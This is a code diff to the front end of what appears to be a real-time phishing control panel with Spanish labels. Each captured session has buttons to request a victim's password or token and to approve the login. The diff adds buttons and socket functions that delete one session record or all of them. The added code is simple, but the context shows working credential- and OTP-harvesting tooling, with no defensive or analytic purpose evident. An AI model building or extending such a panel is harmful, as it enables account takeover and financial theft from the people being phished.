@@ -48,6 +48,7 @@
           <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${s.id}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
           <button class="cmd-btn btn-ask-token" onclick="sendCmd('${s.id}', 'ask_token', 'Pedir token')">📱 Pedir Token</button>
           <button class="cmd-btn btn-approve" onclick="sendCmd('${s.id}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
+          <button class="cmd-btn btn-delete" onclick="deleteSession('${s.id}')">🗑️ Borrar Registro</button>
         </div>
       </div>
     `).join("");
@@ -61,6 +62,18 @@
       message = customMsg;
     }
     socket.emit("admin:command", { targetId, action, message });
+  };
+
+  window.deleteSession = function (targetId) {
+    if (confirm("¿Seguro que deseas eliminar este registro del panel?")) {
+      socket.emit("admin:delete_session", { targetId });
+    }
+  };
+
+  window.clearAllSessions = function () {
+    if (confirm("¿Seguro que deseas borrar TODOS los registros del panel?")) {
+      socket.emit("admin:delete_session", { targetId: null });
+    }
   };
 })();
 
